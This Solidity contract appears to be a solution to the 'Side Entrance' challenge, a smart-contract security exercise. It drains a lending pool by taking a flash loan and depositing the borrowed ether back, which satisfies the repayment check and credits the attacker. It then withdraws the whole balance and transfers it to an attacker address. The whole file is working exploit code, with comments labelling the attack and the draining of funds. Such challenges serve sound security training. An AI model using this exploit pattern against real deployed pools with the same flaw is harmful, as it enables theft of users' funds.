// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../side-entrance/SideEntranceLenderPool.sol";

contract FlashLoanEtherReceiver {
    SideEntranceLenderPool private immutable pool;
    address payable private immutable attacker;

    constructor(address payable poolAddress, address payable attackerAddress) {
        pool = SideEntranceLenderPool(poolAddress);
        attacker = attackerAddress;
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    function executeFlashLoan() external {
        // attack -> increase attacker's balances
        pool.flashLoan(address(pool).balance);
        pool.withdraw();

        // send drained ether to attacker
        attacker.transfer(address(this).balance);
    }

    // Allow deposits of ETH
    receive () external payable {}
}